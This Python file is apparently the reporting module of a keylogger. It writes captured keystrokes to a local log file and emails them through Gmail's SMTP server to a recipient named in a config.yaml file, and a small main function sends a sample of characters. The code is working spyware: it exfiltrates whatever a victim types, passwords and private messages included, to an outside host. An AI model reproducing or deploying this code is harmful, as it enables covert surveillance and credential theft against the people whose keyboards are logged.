from typing import List
from os.path import exists
from pynput.keyboard import Key

import smtplib, ssl
from email.message import EmailMessage

import yaml


def report_to_file(keys: List, file_name='log.txt'):
    """Reports keys to local file."""
    write_mode = 'w'

    # Append to log.txt else create one
    if exists('log.txt'):
        write_mode = 'a'

    with open(file_name, write_mode) as f_obj:
        for key in keys:

            if key == Key.space:
                f_obj.write(" ")

            elif key == Key.enter:
                # Append new line to log file, when ENTER is pressed.
                f_obj.write("\n")

            elif key in (Key.shift, Key.shift_r, Key.shift_l):
                pass

            else:
                k = str(key).replace("'", "")
                f_obj.write(k)


def report_with_email(keys: List, config_file: str=None) -> None:
    """Use email as the reporting method."""

    # Read config data from file
    with open("config.yaml", "r") as yaml_file:
        cfg_file = yaml.safe_load(yaml_file)

        sender_email = cfg_file['email']['sender_email']
        receiver_email = cfg_file['email']['receiver_email']
        password = cfg_file['email']['password']
        port = cfg_file['email']['port']


    # Construct the message
    message = EmailMessage()
    message.set_content(f"{keys}")

    message['Subject'] = 'logs'
    message['From'] = sender_email
    message['To'] = receiver_email

    # Establish connection and send mail
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login(sender_email, password)

        server.send_message(message)


def main():
    message = ["s", "o", "m", "e", " ", "T", "e", "x", "c"]

    report_with_email(message)


if __name__ == '__main__':
    main()